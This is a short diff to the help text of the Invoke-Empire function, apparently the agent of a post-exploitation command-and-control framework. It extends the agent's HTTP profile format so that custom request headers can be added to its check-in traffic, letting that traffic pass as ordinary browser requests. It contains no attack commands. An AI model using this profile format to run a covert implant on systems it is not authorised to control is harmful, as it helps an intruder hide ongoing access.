@@ -31,7 +31,7 @@ function Invoke-Empire {
 
         .PARAMETER Profile
         http communication profile
-        request_uris(comma separated)|UserAgents(comma separated)
+        request_uris(comma separated)|UserAgents(comma separated)|header1:val(eg. Accept:text/html)|header2:val2(eg. DNT:1)|...
 
         .PARAMETER LostLimit
         The limit of the number of checkins the agent will miss before exiting
